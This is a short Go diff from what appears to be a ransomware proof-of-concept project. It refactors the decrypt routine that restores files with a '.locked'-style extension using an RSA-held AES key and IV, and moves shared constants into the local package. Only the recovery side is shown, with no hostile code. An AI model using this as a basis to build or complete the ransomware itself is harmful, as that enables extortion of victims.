@@ -11,8 +11,6 @@ import (
 	"crypto/sha256"
 
 	"strings"
-
-	"github.com/redpois0n/cry/common"
 )
 
 func decrypt(file string, priv *rsa.PrivateKey) {
@@ -22,7 +20,7 @@ func decrypt(file string, priv *rsa.PrivateKey) {
 		panic(err)
 	}
 
-	header := data[:common.EncryptedHeaderSize]
+	header := data[:EncryptedHeaderSize]
 	label := []byte("")
 
 	fmt.Println(header)
@@ -33,10 +31,10 @@ func decrypt(file string, priv *rsa.PrivateKey) {
 		panic(err)
 	}
 
-	key := header[:common.KeySize]
-	iv := header[common.KeySize : common.KeySize+aes.BlockSize]
+	key := header[:KeySize]
+	iv := header[KeySize : KeySize+aes.BlockSize]
 
-	data = data[common.EncryptedHeaderSize:]
+	data = data[EncryptedHeaderSize:]
 
 	block, err := aes.NewCipher(key)
 
@@ -47,8 +45,8 @@ func decrypt(file string, priv *rsa.PrivateKey) {
 	cipher := cipher.NewCFBDecrypter(block, iv)
 	cipher.XORKeyStream(data, data)
 
-	if strings.HasSuffix(file, common.LockedExtension) {
-		file = file[:len(file)-len(common.LockedExtension)]
+	if strings.HasSuffix(file, LockedExtension) {
+		file = file[:len(file)-len(LockedExtension)]
 	}
 
 	ioutil.WriteFile(file, data, 0777) // TODO
